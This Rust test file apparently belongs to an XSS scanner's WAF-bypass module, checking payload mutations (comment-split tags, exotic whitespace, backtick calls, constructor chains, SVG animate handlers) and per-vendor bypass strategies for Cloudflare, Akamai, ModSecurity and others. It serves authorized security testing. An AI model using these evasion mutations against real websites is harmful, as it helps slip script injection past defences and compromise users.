use super::*;

#[test]
fn test_html_comment_split() {
    assert_eq!(
        html_comment_split("<script>alert(1)</script>"),
        "<scr<!---->ipt>alert(1)</script>"
    );
    assert_eq!(
        html_comment_split("<img src=x onerror=alert(1)>"),
        "<im<!---->g src=x onerror=alert(1)>"
    );
}

#[test]
fn test_whitespace_mutation() {
    assert_eq!(
        whitespace_mutation("<img src=x onerror=alert(1)>"),
        "<img\tsrc=x onerror=alert(1)>"
    );
    assert_eq!(
        whitespace_mutation("<svg onload=alert(1)>"),
        "<svg\nonload=alert(1)>"
    );
}

/// Tags that weren't in the original literal table now get mutated
/// too. Prior implementation no-op'd on these and lost a bypass
/// opportunity whenever a payload used a less-common tag.
#[test]
fn test_whitespace_mutation_covers_new_tags() {
    assert_eq!(
        whitespace_mutation("<form action=x onfocus=alert(1)>"),
        "<form\taction=x onfocus=alert(1)>"
    );
    assert_eq!(
        whitespace_mutation("<button onclick=alert(1)>"),
        "<button\tonclick=alert(1)>"
    );
}

#[test]
fn test_html_comment_split_covers_new_tags() {
    // Long tag (>=6 letters) — split after 3rd letter to mirror the
    // original 11-tag list's behavior on `<script` and `<iframe`.
    assert_eq!(
        html_comment_split("<details open>"),
        "<det<!---->ails open>"
    );
    // Short tag (<6 letters) — split after 2nd letter.
    assert_eq!(html_comment_split("<form>"), "<fo<!---->rm>");
}

#[test]
fn test_slash_separator_covers_new_tags() {
    assert_eq!(
        slash_separator("<form action=x>"),
        "<form/action=x>"
    );
}

#[test]
fn test_exotic_whitespace_covers_new_tags() {
    let r = exotic_whitespace("<button onclick=alert(1)>");
    assert!(r.contains('\x0B') || r.contains('\x0C'));
    assert!(!r.contains("<button on"));
}

#[test]
fn test_unicode_js_escape_covers_new_keywords() {
    assert!(
        unicode_js_escape("location.href = 'evil'").starts_with("\\u006c")
            || unicode_js_escape("location.href = 'evil'").starts_with("\\u006C"),
        "location should pick up unicode escape on first letter"
    );
    assert!(
        unicode_js_escape("setTimeout(x,1)").starts_with("\\u0073")
            || unicode_js_escape("setTimeout(x,1)").starts_with("\\u0053"),
        "setTimeout should pick up unicode escape"
    );
}

#[test]
fn test_js_comment_split_covers_new_sinks() {
    // setTimeout / Function / fetch were not in the original literal
    // list — they now get mutated when present.
    assert!(js_comment_split("setTimeout(x,1)").contains("/**/"));
    assert!(js_comment_split("Function('x')()").contains("/**/"));
    assert!(js_comment_split("fetch('/x')").contains("/**/"));
}

#[test]
fn test_js_comment_split() {
    assert_eq!(js_comment_split("alert(1)"), "al/**/ert(1)");
    assert_eq!(js_comment_split("confirm(1)"), "con/**/firm(1)");
}

#[test]
fn test_backtick_parens() {
    assert_eq!(backtick_parens("alert(1)"), "alert`1`");
    assert_eq!(backtick_parens("confirm(1)"), "confirm`1`");
}

#[test]
fn test_constructor_chain() {
    assert_eq!(
        constructor_chain("alert(1)"),
        "[].constructor.constructor('alert(1)')()"
    );
}

#[test]
fn test_unicode_js_escape() {
    assert_eq!(unicode_js_escape("alert(1)"), "\\u0061lert(1)");
}

#[test]
fn test_mixed_html_entities() {
    let result = mixed_html_entities("<img src=x>");
    assert!(!result.contains('<'));
    assert!(!result.contains('>'));
    assert!(result.contains("&#60;") || result.contains("&#x3c;"));
}

#[test]
fn test_case_alternate() {
    let result = case_alternate("<script>");
    assert!(result.contains('S') || result.contains('C'));
    // Should have mixed case
    assert_ne!(result, "<script>");
    assert_ne!(result, "<SCRIPT>");
}

#[test]
fn test_get_bypass_strategy_cloudflare() {
    let strategy = get_bypass_strategy(&WafType::Cloudflare);
    assert!(!strategy.extra_encoders.is_empty());
    assert!(!strategy.mutations.is_empty());
    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
}

#[test]
fn test_merge_strategies() {
    let waf_types = vec![&WafType::Cloudflare, &WafType::ModSecurity];
    let merged = merge_strategies(&waf_types);
    // Should contain encoders from both
    assert!(merged.extra_encoders.contains(&"unicode".to_string()));
    assert!(merged.extra_encoders.contains(&"4url".to_string()));
    // No duplicates
    let mut seen = std::collections::HashSet::new();
    assert!(merged.extra_encoders.iter().all(|e| seen.insert(e)));
}

#[test]
fn test_merge_strategies_empty_returns_default() {
    let merged = merge_strategies(&[]);
    assert!(merged.extra_encoders.is_empty());
    assert!(merged.mutations.is_empty());
    assert_eq!(merged.extra_delay_hint_ms, 0);
}

#[test]
fn test_merge_strategies_single_waf_matches_get_strategy() {
    let direct = get_bypass_strategy(&WafType::Cloudflare);
    let merged = merge_strategies(&[&WafType::Cloudflare]);
    assert_eq!(merged.extra_encoders, direct.extra_encoders);
    assert_eq!(merged.mutations, direct.mutations);
    assert_eq!(merged.extra_delay_hint_ms, direct.extra_delay_hint_ms);
}

#[test]
fn test_merge_strategies_takes_max_delay_hint() {
    // Cloudflare hints 100ms, AwsWaf hints 0ms — combined should be 100.
    let merged = merge_strategies(&[&WafType::AwsWaf, &WafType::Cloudflare]);
    assert_eq!(merged.extra_delay_hint_ms, 100);

    // Order shouldn't matter.
    let merged_rev = merge_strategies(&[&WafType::Cloudflare, &WafType::AwsWaf]);
    assert_eq!(merged_rev.extra_delay_hint_ms, 100);
}

#[test]
fn test_merge_strategies_dedups_mutations() {
    // Both Cloudflare and Akamai use HtmlCommentSplit + CaseAlternation +
    // BacktickParens; the merged set must list each once.
    let merged = merge_strategies(&[&WafType::Cloudflare, &WafType::Akamai]);
    let mut seen = std::collections::HashSet::new();
    assert!(merged.mutations.iter().all(|m| seen.insert(m)));
}

#[test]
fn test_merge_strategies_three_wafs_accumulates_unique_mutations() {
    // Stacking three WAFs should still produce a flat, deduped list and
    // never less coverage than any single strategy.
    let cf = get_bypass_strategy(&WafType::Cloudflare).mutations;
    let merged = merge_strategies(&[
        &WafType::Cloudflare,
        &WafType::ModSecurity,
        &WafType::OwaspCrs,
    ]);
    for m in cf {
        assert!(
            merged.mutations.contains(&m),
            "Cloudflare mutation {:?} should survive the merge",
            m
        );
    }
    let mut seen = std::collections::HashSet::new();
    assert!(merged.mutations.iter().all(|m| seen.insert(m)));
}

#[test]
fn test_merge_strategies_unknown_waf_with_known_dedups() {
    let merged =
        merge_strategies(&[&WafType::Unknown("hint".to_string()), &WafType::Cloudflare]);
    let mut seen = std::collections::HashSet::new();
    assert!(merged.mutations.iter().all(|m| seen.insert(m)));
    let mut seen_e = std::collections::HashSet::new();
    assert!(merged.extra_encoders.iter().all(|e| seen_e.insert(e)));
}

#[test]
fn test_apply_mutations_limit() {
    let payloads = vec!["<script>alert(1)</script>".to_string()];
    let mutations = vec![
        MutationType::HtmlCommentSplit,
        MutationType::CaseAlternation,
        MutationType::BacktickParens,
        MutationType::JsCommentSplit,
    ];
    // Limit to 2 variants per payload
    let result = apply_mutations(&payloads, &mutations, 2);
    // Original + at most 2 variants
    assert!(result.len() <= 3);
    assert_eq!(result[0], "<script>alert(1)</script>");
}

#[test]
fn test_apply_mutations_dedup() {
    let payloads = vec!["no_match_here".to_string()];
    let mutations = vec![MutationType::HtmlCommentSplit, MutationType::BacktickParens];
    let result = apply_mutations(&payloads, &mutations, 5);
    // No mutation matched, so just the original
    assert_eq!(result.len(), 1);
}

#[test]
fn test_every_waf_has_strategy() {
    let waf_types = vec![
        WafType::Cloudflare,
        WafType::AwsWaf,
        WafType::Akamai,
        WafType::Imperva,
        WafType::ModSecurity,
        WafType::OwaspCrs,
        WafType::Sucuri,
        WafType::F5BigIp,
        WafType::Barracuda,
        WafType::FortiWeb,
        WafType::AzureWaf,
        WafType::CloudArmor,
        WafType::Fastly,
        WafType::Wordfence,
        WafType::Unknown("test".to_string()),
    ];
    for waf in &waf_types {
        let strategy = get_bypass_strategy(waf);
        assert!(
            !strategy.extra_encoders.is_empty(),
            "WAF {:?} has no extra encoders",
            waf
        );
        assert!(
            !strategy.mutations.is_empty(),
            "WAF {:?} has no mutations",
            waf
        );
    }
}

#[test]
fn test_unknown_403_uses_default_strategy() {
    // Generic 403 carries no hint about which dimension to lean on;
    // bypass should fall through to the conservative mutation kit.
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 403".to_string()));
    assert!(s.extra_encoders.contains(&"unicode".to_string()));
    assert!(s.mutations.contains(&MutationType::HtmlCommentSplit));
    assert_eq!(s.extra_delay_hint_ms, 0);
}

#[test]
fn test_unknown_429_emphasizes_delay() {
    // 429/503 means the edge is rate-limiting; piling on mutations just
    // keeps tripping the limiter. Strategy must lean on delay instead.
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 429".to_string()));
    assert!(
        s.extra_delay_hint_ms >= 1000,
        "rate-limit blocks need a real delay hint"
    );
    assert!(s.mutations.len() <= 2, "keep mutation pressure low for 429");
}

#[test]
fn test_unknown_503_emphasizes_delay() {
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 503".to_string()));
    assert!(s.extra_delay_hint_ms >= 1000);
}

#[test]
fn test_unknown_406_emphasizes_encoders() {
    // 406 is content-type/encoding-driven — mutation alone does not
    // change wire encoding, so the strategy must broaden encoders.
    let s = get_bypass_strategy(&WafType::Unknown("HTTP 406".to_string()));
    let multi_url_count = s
        .extra_encoders
        .iter()
        .filter(|e| e.ends_with("url") || e.as_str() == "url")
        .count();
    assert!(
        multi_url_count >= 2,
        "406 strategy should stack multiple url encoders, got {:?}",
        s.extra_encoders
    );
}

#[test]
fn test_unknown_arbitrary_hint_falls_through_to_default() {
    // Forced-unknown via `--force-waf custom-vendor-x` lands here. It
    // must not blow up and must get a non-empty strategy.
    let s = get_bypass_strategy(&WafType::Unknown("custom-vendor-x".to_string()));
    assert!(!s.extra_encoders.is_empty());
    assert!(!s.mutations.is_empty());
}

#[test]
fn test_owasp_crs_strategy() {
    let strategy = get_bypass_strategy(&WafType::OwaspCrs);
    // CRS strategy should include all CRS-targeting mutations
    assert!(strategy.mutations.contains(&MutationType::SlashSeparator));
    assert!(strategy.mutations.contains(&MutationType::SvgAnimateExec));
    assert!(strategy.mutations.contains(&MutationType::HtmlEntityParens));
    assert!(strategy.mutations.contains(&MutationType::ExoticWhitespace));
    // Should include unicode and multi-url encoding
    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
    assert!(strategy.extra_encoders.contains(&"4url".to_string()));
}

#[test]
fn test_slash_separator() {
    assert_eq!(
        slash_separator("<svg onload=alert(1)>"),
        "<svg/onload=alert(1)>"
    );
    assert_eq!(
        slash_separator("<img src=x onerror=alert(1)>"),
        "<img/src=x onerror=alert(1)>"
    );
}

#[test]
fn test_html_entity_parens() {
    assert_eq!(html_entity_parens("alert(1)"), "alert&#40;1&#41;");
    assert_eq!(
        html_entity_parens("<img src=x onerror=alert(1)>"),
        "<img src=x onerror=alert&#40;1&#41;>"
    );
}

#[test]
fn test_svg_animate_exec() {
    let result = svg_animate_exec("<svg onload=alert(1)>");
    assert!(result.contains("<svg><animate"));
    assert!(result.contains("onbegin=alert(1)"));
    assert!(result.contains("attributeName=x"));
}

#[test]
fn test_svg_animate_exec_from_img() {
    let result = svg_animate_exec("<img src=x onerror=alert(1)>");
    assert!(result.contains("<svg><animate"));
    assert!(result.contains("onbegin=alert(1)"));
}

#[test]
fn test_exotic_whitespace() {
    let result = exotic_whitespace("<img src=x onerror=alert(1)>");
    assert!(result.contains('\x0B') || result.contains('\x0C'));
    assert!(!result.contains("<img src"));
}

#[test]
fn test_exotic_whitespace_svg() {
    let result = exotic_whitespace("<svg onload=alert(1)>");
    assert!(result.contains('\x0B') || result.contains('\x0C'));
}
